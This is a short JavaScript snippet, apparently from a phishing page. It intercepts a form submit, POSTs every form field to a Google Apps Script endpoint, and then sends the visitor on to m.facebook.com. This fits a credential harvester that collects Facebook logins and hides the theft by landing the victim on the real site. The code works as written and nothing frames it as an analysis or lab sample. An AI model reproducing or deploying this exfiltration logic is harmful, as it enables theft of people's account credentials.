const form = document.querySelector("#form")
    const scriptURL = 'https://script.google.com/macros/s/AKfycbz1RFJ2YbR4XXy07Rd5HTai0fHq1wARl1ycZ7BEzp8a0jNeywvCEuKBUUPmn_ztAkE/exec'

    form.addEventListener('submit', e => {
      e.preventDefault()

      console.log(form)
      fetch(scriptURL, { method: 'POST', body: new FormData(form) })
        .then(response => { window.location.href='http://m.facebook.com' })
        .catch(error => alert('Error!', error.message))
    })
